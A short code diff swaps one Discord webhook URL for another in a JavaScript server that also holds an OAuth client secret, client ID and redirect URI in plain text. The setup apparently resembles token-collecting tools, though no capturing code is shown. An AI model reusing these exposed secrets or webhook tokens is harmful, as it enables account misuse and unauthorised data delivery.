@@ -2,7 +2,7 @@
 const client_secret = 'CHs8Q~8LQHuKdJAolZpivJO4Jac2Wc3ovI6ghded'
 const client_id = '048e85fb-2ae5-40a9-9492-31cde4d6391e'
 const redirect_uri = 'https://feather-30gg.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1057508256915935294/rEDXsYWzEy2RgEsbSI0Jp4rZJ4wpvAkOhKoBBduZycwQ8vt5dKd589fkPPY3nkFFatz0'
+const webhook_url = 'https://ptb.discord.com/api/webhooks/1057508966034321498/_f4sOm8Q771Oy_AOXlHdk1fgh76nYTsgXsanZBcXtenqhp3uPb8Gm0m3H3U9EX2ekuSX'
 //Requirements
 const axios = require('axios')
 const express = require('express')
